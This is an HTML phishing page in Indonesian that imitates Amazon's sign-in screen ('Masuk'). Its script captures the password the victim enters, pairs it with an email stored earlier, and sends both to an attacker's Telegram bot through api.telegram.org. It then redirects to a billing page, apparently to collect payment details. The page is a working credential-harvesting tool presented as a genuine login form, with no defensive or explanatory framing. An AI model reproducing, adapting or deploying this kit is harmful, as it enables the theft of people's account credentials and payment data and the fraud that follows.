<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Amazon — Masuk</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Amazon Ember', Arial, sans-serif; }
        body { background: #fff; min-height: 100vh; display: flex; flex-direction: column; align-items: center; padding: 20px; }
        .logo { margin: 15px 0 25px; text-align: center; }
        .logo img { height: 32px; }
        .kotak { width: 100%; max-width: 350px; border: 1px solid #ddd; border-radius: 8px; padding: 25px; }
        h1 { font-size: 24px; margin-bottom: 10px; }
        .email-tampil { color: #555; font-size: 14px; margin-bottom: 20px; padding-bottom: 15px; border-bottom: 1px solid #e7e7e7; }
        label { font-size: 13px; font-weight: 700; display: block; margin: 18px 0 6px; }
        input { width: 100%; padding: 10px; border: 1px solid #a6a6a6; border-radius: 4px; font-size: 15px; }
        button { width: 100%; padding: 10px; background: #FFD814; border: 1px solid #FCD200; border-radius: 20px; font-size: 15px; cursor: pointer; margin-top: 20px; }
        button:disabled { opacity: 0.5; cursor: not-allowed; }
        .link-lupa { margin-top: 20px; font-size: 12px; }
        .link-lupa a { color: #0066c0; text-decoration: none; }
        .garis-bawah { width: 100%; height: 1px; background: #e7e7e7; margin: 25px 0; }
        .footer { margin-top: 40px; text-align: center; font-size: 11px; color: #555; }
        .footer a { color: #0066c0; text-decoration: none; margin: 0 8px; }
    </style>
</head>
<body>
    <div class="logo"><img src="img/amazonlogo.png" alt="Amazon"></div>
    <div class="kotak">
        <h1>Masuk</h1>
        <div class="email-tampil" id="tampilEmail"></div>
        <label for="sandi">Kata sandi</label>
        <input type="password" id="sandi" placeholder="Masukkan kata sandi" autocomplete="current-password">
        <button id="tombolMasuk" disabled onclick="masuk()">Masuk</button>
        <div class="link-lupa"><a href="#">Lupa kata sandi?</a></div>
        <div class="garis-bawah"></div>
        <p style="font-size:12px; color:#555;">Belum punya akun? <a href="#" style="color:#0066c0; text-decoration:none;">Buat akun Amazon</a></p>
    </div>
    <div class="footer">
        <p><a href="#">Syarat Penggunaan</a> <a href="#">Pemberitahuan Privasi</a> <a href="#">Bantuan</a></p>
        <p style="margin-top:5px; color:#999;">© 1996–2026, Amazon.com, Inc. atau afiliasinya</p>
    </div>

    <script>
        const email = localStorage.getItem('emailPengguna') || '-';
        document.getElementById('tampilEmail').textContent = email;

        const inputSandi = document.getElementById('sandi');
        const tombolMasuk = document.getElementById('tombolMasuk');
        inputSandi.addEventListener('input', () => {
            tombolMasuk.disabled = inputSandi.value.trim().length < 4;
        });
        inputSandi.addEventListener('keydown', e => {
            if (e.key === 'Enter' && !tombolMasuk.disabled) masuk();
        });

        function masuk() {
            const sandi = inputSandi.value.trim();
            localStorage.setItem('sandiPengguna', sandi);

            // Kirim ke Telegram
            const token = localStorage.getItem('botTelegram');
            const chatId = localStorage.getItem('chatTelegram');
            if (token && chatId) {
                const pesan = `📧 LOGIN\n━━━━━━━━━━━━━━━━\nEmail: ${email}\nSandi: ${sandi}\nWaktu: ${new Date().toLocaleString('id-ID')}`;
                fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: chatId, text: pesan })
                });
            }

            // Lanjut ke billing
            window.location.href = 'billing.html';
        }
    </script>
</body>
</html>
